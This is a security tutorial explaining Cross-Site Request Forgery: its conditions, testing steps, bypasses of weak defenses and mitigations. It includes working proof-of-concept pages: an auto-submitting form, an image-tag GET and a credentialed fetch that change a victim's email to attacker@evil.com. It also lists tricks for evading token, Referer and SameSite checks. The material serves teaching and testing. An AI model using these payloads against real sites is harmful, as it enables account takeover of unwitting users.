# What is CSRF?

Cross-Site Request Forgery (CSRF, "sea-surf") tricks a logged-in victim's browser into sending a **state-changing request they never intended**. Because browsers automatically attach cookies to requests for a site, the target sees a perfectly valid, authenticated request - even though the attacker's page triggered it.

Analogy: you are logged into your bank in one tab. In another tab you open a malicious site. That site silently submits a "transfer money" form to your bank. Your bank cookie rides along automatically, so the transfer succeeds as *you*.

## Three conditions must all be true

1. **A relevant action** exists (transfer money, change email/password, delete account)
2. **Cookie-based session handling** - the request is authenticated *only* by a cookie the browser sends automatically
3. **No unpredictable parameters** - the attacker can guess/build the whole request (no anti-CSRF token)

If any one is missing, CSRF usually does not work. This is why anti-CSRF tokens (condition 3) are the standard fix.

## Impact

- Change victim's email/password -> **account takeover**
- Transfer funds, make purchases, change settings
- Add an attacker as admin (CSRF on an admin panel)

## Step-by-step testing

1. Log in and capture a state-changing request in Burp (e.g. "change email").
2. Look for an anti-CSRF token in the body/headers.
3. **Remove the token** and replay. Still works? -> vulnerable (no token check).
4. **Use a different user's token** (or an empty/invalid one). Accepted? -> token not tied to the session.
5. Change the request **method** (POST -> GET) and see if it still works.
6. Change `Content-Type` from `application/json` to `application/x-www-form-urlencoded` or `text/plain` - JSON endpoints are sometimes only protected by the content type.
7. Check `SameSite` on the session cookie in the real browser (DevTools -> Application -> Cookies).

## Proof-of-concept (PoC) pages

**Auto-submitting POST form** (host this on a page the victim visits):

```html
<html>
  <body>
    <form action="https://bank.tld/email/change" method="POST" id="x">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.getElementById('x').submit();</script>
  </body>
</html>
```

**GET-based CSRF** (even simpler - fires from an image tag):

```html
<img src="https://bank.tld/email/change?new=attacker@evil.com">
```

**JSON endpoint via `fetch`** (works only if the server ignores content type / CORS is loose):

```html
<script>
fetch('https://bank.tld/api/email', {
  method: 'POST',
  credentials: 'include',              // send cookies
  headers: {'Content-Type':'text/plain'},
  body: '{"email":"attacker@evil.com"}'
});
</script>
```

## Bypassing weak defenses

```text
# Token tied to session? Try:
- Remove the token parameter entirely
- Send an empty token value
- Use YOUR OWN valid token on the victim (if not bound to their session)
- Swap POST for GET

# Referer-based check? Try:
- Remove the Referer with <meta name="referrer" content="no-referrer">
- The check may only validate the domain is PRESENT, so put the target domain
  in your URL path or query: https://attacker.com/?bank.tld

# SameSite=Lax? Top-level GET navigations still send the cookie:
- Use a GET-based CSRF or a form that navigates the top window
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - right-click a request -> **Engagement tools -> Generate CSRF PoC**
- [OWASP ZAP](https://www.zaproxy.org/) - CSRF token detection and PoC generation

## Mitigation - the fix

- **Anti-CSRF tokens** (synchronizer token pattern): a random, per-session (or per-request) token in a hidden field, validated server-side. Most frameworks provide this (Django `{% csrf_token %}`, Rails `protect_from_forgery`, Spring Security CSRF).
- **`SameSite=Lax` or `Strict`** on session cookies (Lax is the modern browser default and blocks most cross-site POST CSRF).
- **Double-submit cookie** pattern for stateless APIs.
- **Re-authentication / step-up MFA** for sensitive actions.
- **Custom request header** (e.g. `X-Requested-With`) that only same-origin JS can set, combined with CORS.
- Verify `Origin`/`Referer` on state-changing requests as defense in depth.

```python
# Django - the token is validated automatically when using {% csrf_token %}
# In the template:
#   <form method="post">{% csrf_token %} ... </form>
```

## Practice

- [PortSwigger CSRF labs](https://portswigger.net/web-security/csrf) - covers token, SameSite, and Referer bypasses
- OWASP Juice Shop

## Deep dive

- [CSRF - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)

## CWE

- CWE-352: Cross-Site Request Forgery
